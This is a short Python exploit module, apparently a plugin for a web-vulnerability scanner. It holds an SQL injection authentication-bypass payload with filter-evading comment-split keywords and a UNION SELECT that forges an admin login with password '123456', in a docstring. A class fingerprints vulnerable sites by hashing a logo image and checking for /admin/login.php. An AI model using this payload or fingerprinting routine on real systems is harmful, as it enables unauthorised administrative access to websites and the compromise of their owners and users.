# coding:utf-8
import requests

'''
user=admin' a/**/*nd 0 un/**/*ion sel/**/*ect null,'admin',md5(123456),null,null a/**/*nd '1
password=123456
'''
def md5encode(string):
    import hashlib
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()

class Exploit:

    finger = '/upload/mark_logo.gif'
    md5 = "d826040eadbaaa02650b0b4450ad4be1"

    def attack(self, url):
        response = requests.get(url+self.finger)
        if response.status_code == 200 and md5encode(response.content) == self.md5 and requests.get(url+"/admin/login.php").status_code == 200:
            return url